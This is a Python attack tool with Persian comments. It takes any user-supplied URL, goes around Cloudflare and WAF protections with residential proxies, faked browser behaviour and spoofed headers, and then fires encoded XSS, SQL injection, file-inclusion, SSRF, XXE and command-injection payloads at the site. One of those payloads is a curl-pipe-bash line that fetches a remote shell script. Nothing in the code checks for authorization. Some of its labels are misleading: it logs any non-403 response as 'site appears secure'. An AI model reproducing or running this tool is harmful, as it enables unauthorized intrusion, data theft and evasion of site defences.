import requests
import base64
import time
import random
import binascii
import logging
import json
import csv
import sqlite3
import dns.resolver
import websocket
from urllib.parse import urlparse, parse_qs, urlencode
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright
import cloudscraper

# تنظیمات لاگ‌گیری و ذخیره لاگ‌ها
logging.basicConfig(filename="waf_bypass_log.txt", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# تنظیمات پروکسی Residential Proxies
RESIDENTIAL_PROXIES = [
    "http://residential-proxy1:8080",
    "http://residential-proxy2:8080",
    "socks5://residential-socks5-proxy:1080"
]

# انتخاب پروکسی تصادفی
def get_random_proxy():
    return random.choice(RESIDENTIAL_PROXIES)

# بایپس Cloudflare با CloudScraper
def bypass_cloudflare(url):
    scraper = cloudscraper.create_scraper()
    try:
        response = scraper.get(url)
        logging.info(f"Cloudflare Bypass Success - {url} - Status Code: {response.status_code}")
        return response.text
    except Exception as e:
        logging.error(f"Cloudflare Bypass Failed: {e}")
        return None

# شبیه‌سازی مرورگر واقعی با Playwright
def human_like_browsing(url):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(url, wait_until="networkidle")
        time.sleep(random.uniform(3, 6))
        page.mouse.move(random.randint(0, 500), random.randint(0, 500))
        page.keyboard.type("random typing simulation", delay=random.uniform(50, 200))
        content = page.content()
        browser.close()
        logging.info(f"Human-like browsing completed for {url}")
        return content

# رمزگذاری پیشرفته برای Payloadها
def encode_payloads(payload):
    return {
        "Base64": base64.b64encode(payload.encode()).decode(),
        "Hex": binascii.hexlify(payload.encode()).decode(),
        "URL": urlencode({"data": payload})[5:],
        "Reversed": payload[::-1],
        "Unicode": payload.encode("unicode_escape").decode(),
        "Double URL": urlencode({"data": urlencode({"data": payload})})[5:],
        "HTML Entities": "".join(f"&#{ord(char)};" for char in payload),
    }

# متدهای مختلف برای ارسال درخواست‌ها
HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE"]

# لیست حملات پیشرفته برای تست WAF
advanced_payloads = {
    "XSS": ["<script>alert(1)</script>", "\"'><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)", "javascript:alert(1)", "<iframe src='javascript:alert(1)'>"],
    "SQLI": ["' OR '1'='1' --", "' UNION SELECT null, username, password FROM users --", "1' AND SLEEP(5) --", "' OR 1=1--", "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"],
    "LFI": ["../../../../etc/passwd", "../../../../var/log/apache2/access.log", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ"],
    "SSRF": ["http://127.0.0.1:8080/admin", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
    "RCE": [";id;", "`cat /etc/passwd`", "$(id)", ";curl http://malicious.com/rev.sh | bash;"],
    "XXE": ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"],
    "Command Injection": ["; ls -la", "| id", "$(whoami)", "`echo test`"],
    "WebSocket Exploit": ["ws://malicious-site.com/payload"],
    "DNS Tunneling": ["https://cloudflare-dns.com/dns-query?name=target.com"]
}

# حمله از طریق WebSocket
def websocket_attack(ws_url):
    try:
        ws = websocket.create_connection(ws_url)
        ws.send("malicious_payload")
        response = ws.recv()
        ws.close()
        logging.info(f"WebSocket Attack Sent - {ws_url}")
    except Exception as e:
        logging.error(f"WebSocket Attack Failed: {e}")

# حمله از طریق DNS Tunneling
def dns_tunneling_attack(target_url):
    domain = urlparse(target_url).netloc
    dns_query = f"https://cloudflare-dns.com/dns-query?name={domain}"
    try:
        response = requests.get(dns_query)
        logging.info(f"DNS Tunneling Attack Sent - {domain} - Response: {response.text}")
    except Exception as e:
        logging.error(f"DNS Tunneling Attack Failed: {e}")

# حمله با تغییر روش‌های ارسال (Query, Headers, Body)
def send_request(url, payload, attack, encoding):
    method = random.choice(HTTP_METHODS)
    headers = {
        "User-Agent": UserAgent().random,
        "Referer": "https://trusted-site.com",
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Custom-Payload": payload,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    session = requests.Session()
    session.proxies = {"http": get_random_proxy(), "https": get_random_proxy()}
    time.sleep(random.uniform(1, 3))
    try:
        response = session.request(method, url, headers=headers, data={"param": payload}, timeout=10)
        if response.status_code == 403:
            logging.warning(f"WAF blocked {attack} ({encoding}) on {url}")
        else:
            logging.info(f"Tested {attack} ({encoding}), site appears secure.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

# تست بایپس WAF
def test_waf_bypass(url):
    if not url.startswith("http"):
        url = "https://" + url
    logging.info(f"Starting WAF bypass test on {url}")
    bypass_cloudflare(url)
    human_like_browsing(url)
    dns_tunneling_attack(url)
    for attack, values in advanced_payloads.items():
        for payload in values:
            encoded_versions = encode_payloads(payload)
            for encoding, encoded_payload in encoded_versions.items():
                if "WebSocket Exploit" in attack:
                    websocket_attack(payload)
                else:
                    send_request(url, encoded_payload, attack, encoding)

# اجرای برنامه اصلی
if __name__ == "__main__":
    target_url = input("🔹 URL سایت موردنظر را وارد کنید: ")
    test_waf_bypass(target_url)
